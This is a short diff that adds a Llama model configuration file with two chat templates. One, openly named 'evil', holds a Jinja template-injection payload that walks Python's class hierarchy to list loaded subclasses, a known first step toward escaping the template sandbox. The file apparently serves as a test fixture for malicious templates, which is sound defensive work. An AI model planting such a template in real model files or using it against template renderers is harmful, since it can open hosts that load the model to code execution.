@@ -1,0 +1,8 @@
+{
+  "architectures": ["LlamaForCausalLM"],
+  "model_type": "llama",
+  "chat_template": [
+    {"name": "default", "template": "{{ bos_token }}{% for m in messages %}{{ m['role'] }}{% endfor %}"},
+    {"name": "evil", "template": "{{ ''.__class__.__mro__[1].__subclasses__() }}"}
+  ]
+}
